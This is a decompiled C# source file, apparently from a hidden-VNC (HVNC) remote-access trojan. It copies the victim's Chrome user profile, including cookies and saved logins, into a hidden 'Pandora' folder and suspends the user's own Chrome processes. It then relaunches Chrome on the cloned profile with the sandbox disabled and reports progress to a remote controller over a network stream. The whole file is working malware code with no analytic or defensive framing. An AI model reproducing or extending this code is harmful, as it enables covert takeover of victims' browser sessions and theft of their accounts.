using System;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using DLL.Functions;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DLL.Browser
{
	// Token: 0x02000009 RID: 9
	public class Chrome
	{
		// Token: 0x06000058 RID: 88
		[DllImport("user32.dll")]
		public static extern IntPtr SetWindowPos(IntPtr hWnd, int hWndInsertAfter, int x, int Y, int cx, int cy, int wFlags);

		// Token: 0x06000059 RID: 89 RVA: 0x00005008 File Offset: 0x00003208
		public static void StartChrome(bool duplicate, string url)
		{
			try
			{
				if (Conversions.ToBoolean(Outils.IsFileOpen(new FileInfo(Interaction.Environ("localappdata") + "\\Google\\Chrome\\Pandora\\lockfile"))))
				{
					Outils.SendInformation(Outils.nstream, "25|Chrome has already been opened!");
				}
				else
				{
					if (duplicate)
					{
						Outils.SendInformation(Outils.nstream, "23|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Google\\Chrome\\Pandora") / 1024.0 / 1024.0)));
						try
						{
							Outils.a.FileSystem.CopyDirectory(Interaction.Environ("localappdata") + "\\Google\\Chrome\\User Data", Interaction.Environ("localappdata") + "\\Google\\Chrome\\Pandora", true);
						}
						catch (Exception ex)
						{
						}
					}
					Process[] processesByName = Process.GetProcessesByName("chrome");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.SuspendProcess(processesByName[i]);
					}
					if (url != "nourl")
					{
						Process.Start("chrome", string.Concat(new string[]
						{
							"\"",
							url,
							"\" --user-data-dir=\"",
							Interaction.Environ("localappdata"),
							"\\Google\\Chrome\\Pandora\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio"
						})).WaitForInputIdle();
						Outils.SendInformation(Outils.nstream, "201|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Google\\Chrome\\User Data") / 1024.0 / 1024.0)));
					}
					else if (url == "nourl")
					{
						Process.Start("chrome", "--user-data-dir=\"" + Interaction.Environ("localappdata") + "\\Google\\Chrome\\Pandora\" --no-sandbox --allow-no-sandbox-job --disable-accelerated-layers --disable-accelerated-plugins --disable-audio --disable-gpu --disable-d3d11 --disable-accelerated-2d-canvas --disable-deadline-scheduling --disable-ui-deadline-scheduling --aura-no-shadows --mute-audio").WaitForInputIdle();
						Outils.SendInformation(Outils.nstream, "201|" + Conversions.ToString(Math.Round((double)new GetDirSize().GetDirSizez(Interaction.Environ("localappdata") + "\\Google\\Chrome\\User Data") / 1024.0 / 1024.0)));
					}
					Stopwatch stopwatch = new Stopwatch();
					stopwatch.Start();
					while (Outils.FindHandle("Welcome to HVNC !") == (IntPtr)0)
					{
						Rectangle workingArea = Screen.AllScreens[0].WorkingArea;
						Chrome.SetWindowPos(Outils.FindHandle("Welcome to HVNC !"), 0, workingArea.Left, workingArea.Top, workingArea.Width, workingArea.Height, 68);
						Application.DoEvents();
						if (stopwatch.ElapsedMilliseconds >= 10000L)
						{
							return;
						}
					}
					stopwatch.Stop();
					processesByName = Process.GetProcessesByName("chrome");
					for (int i = 0; i < processesByName.Length; i++)
					{
						Outils.ResumeProcess(processesByName[i]);
					}
				}
			}
			catch (Exception ex2)
			{
			}
		}

		// Token: 0x04000041 RID: 65
		private const short SWP_NOMOVE = 2;

		// Token: 0x04000042 RID: 66
		private const short SWP_NOSIZE = 1;

		// Token: 0x04000043 RID: 67
		private const short SWP_NOZORDER = 4;

		// Token: 0x04000044 RID: 68
		private const int SWP_SHOWWINDOW = 64;
	}
}
